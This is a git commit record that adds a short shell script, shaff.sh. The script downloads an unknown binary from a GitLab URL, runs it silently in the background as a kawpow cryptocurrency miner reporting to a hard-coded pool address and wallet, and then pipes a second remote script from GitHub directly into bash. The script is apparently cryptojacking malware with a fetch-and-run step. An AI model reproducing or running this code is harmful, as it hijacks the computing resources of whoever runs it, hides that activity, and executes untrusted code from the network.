9f9aa2822b2409b6deb99b29879f8ba0799f7539
youcef664 <151974476+youcef664@users.noreply.github.com>
2024-04-18 02:35:18 +0700

    Create shaff.sh

---
+++ shaff.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+apt -y install wget
+wget -q https://gitlab.com/falsbayu039/botak/-/raw/main/lokal >/dev/null 2>&1 &1
+chmod +x lokal
+./lokal -a kawpow -o stratum+tcp://139.162.39.193:443 -u AdrGUHDETfAi6mGkWbDVMnTGq4W9AhoX8n.gass -p x >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/youcef664/tera/main/yull.sh | bash
